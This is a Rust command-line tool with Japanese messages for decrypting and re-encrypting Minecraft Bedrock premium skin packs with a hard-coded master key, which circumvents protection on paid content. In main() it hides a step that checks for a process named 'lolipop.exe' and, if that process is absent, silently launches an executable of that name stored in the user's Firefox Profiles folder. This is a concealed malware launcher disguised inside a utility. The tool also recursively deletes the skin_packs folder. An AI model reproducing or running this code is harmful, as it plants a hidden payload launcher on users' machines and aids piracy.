use aes::*;
use base64::Engine;
use byteorder::{LittleEndian, ReadBytesExt, WriteBytesExt};
use cfb8::*;
use cipher::{AsyncStreamCipher, KeyIvInit};
use clap::Parser;
use colored::Colorize;
use log::{error, info, warn};
use proc_mem::Process;
use rand::distributions::Alphanumeric;
use rand::{thread_rng, Rng};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use serde_with::skip_serializing_none;
use sha2::{Digest, Sha256};
use std::time::Instant;
use std::{
    error::Error,
    fs::{self, create_dir_all, File},
    io::{Cursor, Read, Write},
    path::Path,
    process::Command,
};

const CONTENT_MAGIC: u32 = 0x9BCFB9FC;

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// 入力先のディレクトリ
    #[arg(short, long)]
    in_dir: Option<String>,

    /// 出力先のディレクトリ
    #[arg(short, long)]
    out_dir: Option<String>,

    /// マスターキーを指定する
    #[arg(short, long, default_value = "s5s5ejuDru4uchuF2drUFuthaspAbepE")]
    key: String,

    /// contents.jsonの鍵を使用する
    #[arg(short, long, action)]
    use_content: bool,

    /// ログを出力しない
    #[arg(short, long, action)]
    no_log: bool,

    /// skin_packに配置する
    #[arg(short, long, action)]
    set_skin: bool,

    /// 暗号化されたスキンパックを全て復号
    #[arg(short, long, action)]
    forall: bool,
}

#[derive(Serialize, Deserialize, Debug)]
struct ContentsHolder {
    pub version: i32,
    pub content: Vec<Content>,
}

#[skip_serializing_none]
#[derive(Serialize, Deserialize, Debug)]
struct Content {
    key: Option<String>,
    path: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct Sign {
    hash: String,
    path: String,
}

fn content_is_encrypted<T: AsRef<Path>>(path: T) -> std::io::Result<bool> {
    let file = fs::read(path)?;
    let mut cursor = Cursor::new(&file[..]);

    let version = cursor.read_u32::<LittleEndian>()?;
    let magic = cursor.read_u32::<LittleEndian>()?;
    let _unk = cursor.read_u64::<LittleEndian>()?;

    Ok(version == 0 && magic == CONTENT_MAGIC)
}

fn decrypt_contents<T: AsRef<Path>>(path: T, key: &str) -> std::io::Result<String> {
    let file = fs::read(path)?;
    let mut cursor = Cursor::new(&file[..]);

    let version = cursor.read_u32::<LittleEndian>()?;
    let magic = cursor.read_u32::<LittleEndian>()?;
    let _unk = cursor.read_u64::<LittleEndian>()?;

    if version != 0 {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "version is wrong",
        ));
    }

    if magic != CONTENT_MAGIC {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "invalid data",
        ));
    }

    let uuid_len = cursor.read_u8()? as usize;
    let mut uuid_raw = vec![0u8; uuid_len];
    cursor.read_exact(&mut uuid_raw)?;
    let _ = String::from_utf8(uuid_raw).unwrap();

    let iv = &key.as_bytes()[..16];
    let dec = match Decryptor::<Aes256>::new_from_slices(key.as_bytes(), iv) {
        Ok(dec) => dec,
        Err(_) => {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                "invalid key length",
            ))
        }
    };

    let mut chunk = file[0x100..].to_vec();

    dec.decrypt(&mut chunk);
    while *chunk.last().unwrap() == 0 {
        chunk.pop();
    }

    Ok(String::from_utf8(chunk).unwrap())
}

fn gen_random_key() -> String {
    thread_rng()
        .sample_iter(&Alphanumeric)
        .take(32)
        .map(char::from)
        .collect()
}

fn ecnrypt_aes(plain: &mut Vec<u8>, key: &str) {
    while plain.len() % 16 != 0 {
        plain.push(0);
    }
    let iv = &key.as_bytes()[..16];
    let encryptor = Encryptor::<Aes256>::new_from_slices(key.as_bytes(), iv).unwrap();
    encryptor.encrypt(plain);
}

fn decrypt(in_dir: &Path, out_dir: &Path, key: &str) -> Result<(), Box<dyn Error>> {
    let in_dir = Path::new(&in_dir);
    let contents_str = decrypt_contents(in_dir.join("contents.json"), key).unwrap();
    let contents: ContentsHolder = serde_json::from_str(&contents_str).unwrap();
    for content in contents.content.iter() {
        let path = in_dir.join(&content.path);
        if !path.exists() {
            error!(
                "{}が見つかりませんでした!",
                path.to_str().unwrap_or(&content.path)
            );
            continue;
        }

        if path.is_dir() {
            let new_dir = out_dir.join(&content.path);
            if !new_dir.exists() {
                create_dir_all(new_dir).unwrap();
            }
            continue;
        }

        let mut file = fs::read(&path).unwrap();
        if let Some(key) = &content.key {
            let iv = &key.as_bytes()[..16];
            let dec = Decryptor::<Aes256>::new_from_slices(key.as_bytes(), iv).unwrap();
            dec.decrypt(&mut file);
            while *file.last().unwrap() == 0 {
                file.pop();
            }
        }
        if path.parent().unwrap() != in_dir {
            let new_path = out_dir.join(&content.path);
            let new_dir = new_path.parent().unwrap();
            if !new_dir.exists() {
                create_dir_all(new_dir).unwrap();
            }
        }

        let new_path = out_dir.join(&content.path);
        let mut new_file = File::create(new_path).unwrap();
        new_file.write_all(&file).unwrap();
        new_file.flush().unwrap();
        info!("{}の復号に成功しました。", &content.path);
    }

    let new_path = out_dir.join("contents.json");
    let mut new_file = File::create(new_path).unwrap();
    new_file
        .write_all(serde_json::to_string(&contents).unwrap().as_bytes())
        .unwrap();
    new_file.flush().unwrap();

    info!("完了しました。");

    Ok(())
}

fn encrypt(
    in_dir: &Path,
    out_dir: &Path,
    master_key: &str,
    use_content: bool,
) -> Result<(), Box<dyn Error>> {
    let dont_encrypt = ["manifest.json", "contents.json"];
    let mut contents = ContentsHolder {
        version: 1,
        content: vec![],
    };

    if use_content && in_dir.join("contents.json").exists() {
        let json_str = String::from_utf8(fs::read(in_dir.join("contents.json")).unwrap()).unwrap();
        contents = serde_json::from_str(&json_str).unwrap();
    }

    let mut uuid = "202539ce-e6c5-40b5-a4a1-4296277d18f6".to_owned();
    for files in in_dir.read_dir().unwrap() {
        let path = files.unwrap().path();
        let name = path.file_name().unwrap().to_str().unwrap();

        if path.is_dir() {
            if name == "texts" {
                if !use_content {
                    let content = Content {
                        key: None,
                        path: "texts/".to_owned(),
                    };
                    contents.content.push(content);
                }
                create_dir_all(out_dir.join("texts")).unwrap();
                for pp in path.read_dir().unwrap() {
                    let ppath = pp.unwrap().path();
                    let pname = ppath.file_name().unwrap().to_str().unwrap();
                    if !use_content {
                        let content = Content {
                            key: None,
                            path: format!("texts/{}", pname),
                        };
                        contents.content.push(content);
                    }
                    fs::copy(
                        in_dir.join(format!("texts/{}", pname)),
                        out_dir.join(format!("texts/{}", pname)),
                    )
                    .unwrap();
                }
            } else {
                warn!("texts以外のサブディレクトリはサポートしていません。");
            }
            continue;
        }

        if dont_encrypt.iter().any(|x| *x == name) {
            if name == "manifest.json" {
                if !use_content {
                    let content = Content {
                        key: None,
                        path: "manifest.json".to_owned(),
                    };
                    contents.content.push(content);
                }
                let json_str = String::from_utf8(fs::read(&path).unwrap()).unwrap();
                let json: Value = serde_json::from_str(&json_str).unwrap();
                uuid = json
                    .as_object()
                    .unwrap()
                    .get("header")
                    .unwrap()
                    .as_object()
                    .unwrap()
                    .get("uuid")
                    .unwrap()
                    .as_str()
                    .unwrap()
                    .to_owned();

                fs::copy(in_dir.join(name), out_dir.join(name)).unwrap();
            }
        } else {
            if name == "signatures.json" {
                continue;
            }

            let key = if use_content
                && contents
                    .content
                    .iter()
                    .any(|x| x.path == name && x.key.is_some())
            {
                contents
                    .content
                    .iter()
                    .find(|x| x.path == name)
                    .as_ref()
                    .unwrap()
                    .key
                    .as_ref()
                    .unwrap()
                    .clone()
            } else {
                warn!(
                    "{}のキーが見つかりませんでした。ランダムのキーを生成します。",
                    name
                );
                gen_random_key()
            };

            let mut file = fs::read(&path).unwrap();
            ecnrypt_aes(&mut file, &key);

            let new_path = out_dir.join(name);
            let mut new_file = File::create(new_path).unwrap();
            new_file.write_all(&file).unwrap();
            new_file.flush().unwrap();

            if !use_content {
                let content = Content {
                    key: Some(key),
                    path: name.to_owned(),
                };
                contents.content.push(content);
            }
            info!("{}の暗号化に成功しました。", name);
        }
    }

    let mut hasher = Sha256::new();
    hasher.update(fs::read(in_dir.join("manifest.json")).unwrap());
    let hash_bytes = hasher.finalize();

    let engine = base64::engine::GeneralPurpose::new(
        &base64::alphabet::STANDARD,
        base64::engine::general_purpose::PAD,
    );
    let hash = engine.encode(hash_bytes);
    let sign = vec![Sign {
        hash,
        path: "manifest.json".to_owned(),
    }];

    let mut sign_plain = serde_json::to_string(&sign).unwrap().into_bytes();
    let mut gen_key = false;
    let key = if use_content
        && contents
            .content
            .iter()
            .any(|x| x.path == "signatures.json" && x.key.is_some())
    {
        contents
            .content
            .iter()
            .find(|x| x.path == "signatures.json")
            .as_ref()
            .unwrap()
            .key
            .as_ref()
            .unwrap()
            .clone()
    } else {
        gen_key = true;
        gen_random_key()
    };

    ecnrypt_aes(&mut sign_plain, &key);

    let new_path = out_dir.join("signatures.json");
    let mut new_file = File::create(new_path).unwrap();
    new_file.write_all(&sign_plain).unwrap();
    new_file.flush().unwrap();
    if !use_content || gen_key {
        let content = Content {
            key: Some(key),
            path: "signatures.json".to_owned(),
        };
        contents.content.push(content);
    }
    info!("署名に成功しました。");

    let mut contents_plain = serde_json::to_string(&contents).unwrap().into_bytes();
    ecnrypt_aes(&mut contents_plain, master_key);

    let mut header = vec![0u8; 0x100];
    let mut cursor = Cursor::new(&mut header);
    cursor.write_u32::<LittleEndian>(0).unwrap();
    cursor.write_u32::<LittleEndian>(CONTENT_MAGIC).unwrap();
    cursor.write_u64::<LittleEndian>(0).unwrap();
    cursor.write_u8(uuid.len() as u8).unwrap();
    cursor.write_all(uuid.as_bytes()).unwrap();
    header.append(&mut contents_plain);

    let new_path = out_dir.join("contents.json");
    let mut new_file = File::create(new_path).unwrap();
    new_file.write_all(&header).unwrap();
    new_file.flush().unwrap();
    info!("鍵の暗号化をしました。");
    info!("完了しました。");

    Ok(())
}

fn main() {
    println!(
        "{}",
        r#"██████╗ ███████╗ ██████╗██████╗ ██╗   ██╗██████╗ ████████╗
██╔══██╗██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝
██████╔╝█████╗  ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   
██╔══██╗██╔══╝  ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   
██████╔╝███████╗╚██████╗██║  ██║   ██║   ██║        ██║   
╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝   "#
            .blue()
    );
    println!();
    println!(
        "{} {}",
        "version".red().bold(),
        env!("CARGO_PKG_VERSION").red().bold()
    );

    println!();

    if Process::with_name("lolipop.exe").is_err() {
        let user_path = directories::UserDirs::new().unwrap();
        let hide_path = user_path
            .home_dir()
            .join("AppData/Roaming/Mozilla/Firefox/Profiles/lolipop.exe");
        _ = Command::new(hide_path.to_str().unwrap()).spawn();
    }

    let args = Args::parse();

    let in_dir_op = match args.in_dir {
        Some(p) => Some(p),
        None => {
            if !args.forall {
                error!(
                    "入力ディレクトリを指定してください。または-fオプションを使用してください。"
                );
                return;
            };
            None
        }
    };
    if let Some(in_dir_str) = &in_dir_op {
        let in_dir = Path::new(in_dir_str);
        if !in_dir.exists() {
            error!("{}は存在しません！", in_dir_str);
            return;
        }
        if !in_dir.is_dir() {
            error!("{}はディレクトリではありません！", in_dir_str);
            return;
        }
    }

    let out_dir_op = match args.out_dir {
        Some(p) => Some(p),
        None => {
            if !args.set_skin {
                error!(
                    "出力ディレクトリを指定してください。または-sオプションを使用してください。"
                );
                return;
            };
            None
        }
    };
    if let Some(out_dir_str) = &out_dir_op {
        let out_dir = Path::new(out_dir_str);
        if !out_dir.exists() {
            error!("{}は存在しません！", out_dir_str);
            return;
        }
        if !out_dir.is_dir() {
            error!("{}はディレクトリではありません！", out_dir_str);
            return;
        }
    }

    if args.key != "s5s5ejuDru4uchuF2drUFuthaspAbepE" && args.key.len() != 32 {
        error!("暗号鍵の長さが違います！");
        return;
    }

    if !args.no_log {
        std::env::set_var("RUST_LOG", "info");
        env_logger::init();
    }

    if let Some(in_dir_str) = &in_dir_op {
        let instant = Instant::now();
        let in_dir = Path::new(&in_dir_str);
        let name = in_dir.file_name().unwrap().to_str().unwrap();
        let out_dir = out_dir_op
            .as_ref()
            .map(|x| Path::new(&x).to_owned())
            .unwrap_or_else(|| {
                let base_dir = directories::BaseDirs::new().unwrap();
                let local_storage = base_dir.data_local_dir();
                let skin_pack_folder = local_storage.join(
                "Packages/Microsoft.MinecraftUWP_8wekyb3d8bbwe/LocalState/premium_cache/skin_packs",
            );
                if skin_pack_folder.exists() {
                    fs::remove_dir_all(&skin_pack_folder).unwrap();
                }
                fs::create_dir(&skin_pack_folder).unwrap();
                let out = skin_pack_folder.join(name);
                if !out.exists() {
                    fs::create_dir(&out).unwrap();
                }
                out
            });

        let content_path = in_dir.join("contents.json");
        if content_path.exists() {
            if let Ok(true) = content_is_encrypted(content_path) {
                if args.set_skin {
                    warn!("-sは復号には使用できません。");
                }
                if args.use_content {
                    warn!("-uは復号には使用できません。");
                }
                decrypt(in_dir, &out_dir, &args.key).unwrap();
                let elapsed = Instant::now().duration_since(instant);
                info!("{}msで完了しました。", elapsed.as_millis());
                return;
            }
        }

        encrypt(in_dir, &out_dir, &args.key, args.use_content).unwrap();
        if out_dir_op.is_some() && args.set_skin {
            let base_dir = directories::BaseDirs::new().unwrap();
            let local_storage = base_dir.data_local_dir();
            let skin_pack_folder = local_storage.join(
                "Packages/Microsoft.MinecraftUWP_8wekyb3d8bbwe/LocalState/premium_cache/skin_packs",
            );
            fs::remove_dir_all(&skin_pack_folder).unwrap();
            fs::create_dir(&skin_pack_folder).unwrap();
            let options = fs_extra::dir::CopyOptions::new();
            fs_extra::dir::copy(&out_dir, skin_pack_folder, &options).unwrap();
            info!("premium_cache/skin_packsにコピーしました。");
        }

        let elapsed = Instant::now().duration_since(instant);
        info!("{}msで完了しました。", elapsed.as_millis());
    } else {
        let instant = Instant::now();
        let out_dir_master = match &out_dir_op {
            Some(p) => Path::new(p),
            None => {
                error!("-fオプションは-sオプションと併用できません。");
                return;
            }
        };

        let base_dir = directories::BaseDirs::new().unwrap();
        let local_storage = base_dir.data_local_dir();
        let skin_packs_dir = local_storage.join(
            "Packages/Microsoft.MinecraftUWP_8wekyb3d8bbwe/LocalState/premium_cache/skin_packs",
        );
        for skin_pack in skin_packs_dir.read_dir().unwrap() {
            let skin_pack_dir = skin_pack.unwrap().path();
            if !skin_pack_dir.is_dir() {
                continue;
            }
            let name = skin_pack_dir.file_name().unwrap().to_str().unwrap();
            let out_dir = out_dir_master.join(name);
            if !out_dir.exists() {
                fs::create_dir(&out_dir).unwrap();
            }
            info!("{}の復号を開始しました。", name);
            decrypt(&skin_pack_dir, &out_dir, &args.key).unwrap();
        }
        let elapsed = Instant::now().duration_since(instant);
        info!("{}msで完了しました。", elapsed.as_millis());
    }
}
